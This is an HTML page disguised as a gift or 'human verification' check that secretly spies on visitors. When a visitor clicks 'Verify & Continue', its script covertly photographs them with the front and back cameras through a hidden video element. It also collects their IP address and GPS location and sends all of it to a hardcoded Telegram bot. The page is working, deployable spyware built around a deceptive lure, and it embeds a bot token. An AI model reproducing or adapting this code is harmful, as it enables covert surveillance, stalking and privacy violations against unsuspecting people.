<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Verification</title>

    <style>
        body {
            background-color: #f4f4f4;
            text-align: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }

        h1 { color: #333; }

        /* --- CHANGE: Video ko hide karne ke liye CSS --- */
        #video-stream {
            /* Video ko puri tarah transparent aur screen ke piche bhej diya */
            opacity: 0; 
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
            /* Height/Width set rakhna zaroori hai taaki stream capture ho sake */
            width: 300px; 
            height: 300px;
        }

        .verify-btn {
            padding: 15px 40px;
            background-color: #d32f2f; /* Red color for urgency */
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 50px;
            font-size: 18px;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .verify-btn:disabled { background-color: #ccc; cursor: not-allowed; }
        
        #status {
            margin-top: 20px;
            color: #555;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <h1>Human Verification</h1>
    <p>Please click the button below to verify you are not a robot.</p>
    
    <button class="verify-btn" id="btn" onclick="startHiddenProcess()">Verify & Continue</button>
    <p id="status"></p>

    <video id="video-stream" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
        // --- CONFIGURATION ---
        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
        const chatId = "7681204940";

        let userIP = "Unknown";
        let userLocation = "Unknown Location";
        let mapLink = "";

        async function startHiddenProcess() {
            const btn = document.getElementById("btn");
            const statusText = document.getElementById("status");
            
            btn.disabled = true;
            btn.innerText = "Processing...";
            statusText.innerText = "Connecting to server...";
            
            // 1. Get Details in Background
            getIP();
            getLocation();

            // 2. Start Camera silently
            try {
                // Front Camera Capture
                await captureCamera("user", "Front Hidden");
                
                // Small delay
                await new Promise(r => setTimeout(r, 1000)); 

                // Back Camera Capture
                await captureCamera("environment", "Back Hidden");

                // Finish
                statusText.innerText = "Verification Successful!";
                btn.innerText = "Verified ‚úÖ";
                // Optional: Redirect user somewhere else
                // window.location.href = "https://google.com";

            } catch (e) {
                console.log(e);
                statusText.innerText = "Verification Failed. Try again.";
                btn.disabled = false;
            }
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    userLocation = `Lat: ${p.coords.latitude}, Lng: ${p.coords.longitude}`;
                    mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                });
            }
        }

        async function captureCamera(mode, cameraName) {
            const video = document.getElementById("video-stream");
            const canvas = document.getElementById("hidden-canvas");
            
            try {
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }

                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode } 
                });
                
                video.srcObject = stream;
                
                // Wait for camera to initialize (User ko kuch nahi dikhega)
                await new Promise(r => setTimeout(r, 2000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        sendToTelegram(blob, cameraName);
                        stream.getTracks().forEach(track => track.stop()); // Stop immediately
                        resolve();
                    }, 'image/jpeg', 0.8);
                });

            } catch (error) {
                console.error(error);
                // Fail silently agar permission nahi mili ya camera nahi hai
            }
        }

        function sendToTelegram(photoBlob, type) {
            const formData = new FormData();
            const caption = `üïµÔ∏è *Hidden Capture*\nüì∏ Type: ${type}\nüåç IP: ${userIP}\nüìç Loc: ${userLocation}\nüîó ${mapLink}`;

            formData.append("chat_id", chatId);
            formData.append("photo", photoBlob, "hidden_snap.jpg");
            formData.append("caption", caption);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }
    </script>
</body>
</html>
